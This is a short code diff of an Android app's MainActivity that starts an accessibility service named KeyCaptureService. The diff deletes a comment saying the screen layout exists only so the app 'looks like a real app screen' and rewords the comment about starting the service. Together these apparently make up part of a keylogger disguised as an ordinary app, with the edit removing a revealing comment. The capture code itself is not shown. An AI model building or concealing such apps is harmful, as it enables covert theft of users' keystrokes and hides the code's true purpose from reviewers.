@@ -8,11 +8,9 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
-        // Load the visual layout XML so it looks like a real app screen
         setContentView(R.layout.activity_main);
 
-        // Explicitly start the accessibility foreground service
+        // Start the accessibility foreground service explicitly
         Intent serviceIntent = new Intent(this, KeyCaptureService.class);
         startService(serviceIntent);
     }
